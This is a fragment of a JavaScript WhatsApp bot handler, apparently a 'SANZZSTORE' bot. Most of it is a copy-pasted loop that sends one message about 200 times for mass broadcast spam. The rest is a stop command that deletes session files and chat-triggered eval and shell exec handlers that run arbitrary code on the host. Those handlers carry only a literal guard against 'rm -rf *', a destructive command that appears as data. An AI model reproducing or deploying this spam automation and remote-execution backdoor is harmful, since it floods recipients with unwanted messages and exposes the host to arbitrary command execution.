    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
        await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);
    await sleep(100000);
    await reply(`.startjpm ${text}`);

    await reply(`.*JPM BY SANZZSTORE*

> *STATUS :* _DONE BEB_
> *COUNT :* _200 PESAN_`);    

                    }
break

case "stopjpm": {
if (!Access) return reply(mess.owner)
await m.reply("Done Beb")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

// end case bug 
default:
if (body.startsWith("~")) {
if (!Access) return;
reply('*execute...*')
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
let bang = util.format(sat)
if (sat === undefined) {
bang = util.format(sul)
}
return bang;
}
try {
(async () => {
try {
const result = await eval(`(async () => { return ${text} })()`)
reply(Return(result))
} catch (e) {
reply(util.format(e))
}
})()
} catch (e) {
reply(util.format(e))
}
}

if (budy.startsWith("X")) {
if (!Access) return
await reaction(m.chat, '😝')
try {
let evaled = await eval(q)
if (typeof evaled !== "string") evaled = util.inspect(evaled)
await reply(evaled)
} catch (e) {
await reply(`Error: ${String(e)}`)
}
}

if (budy.startsWith('-')) {
if (!Access) return
await reaction(m.chat, '😝')
if (text == "rm -rf *") return m.reply("👻")
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update detected in ${__filename}`)
delete require.cache[file]
require(file)
})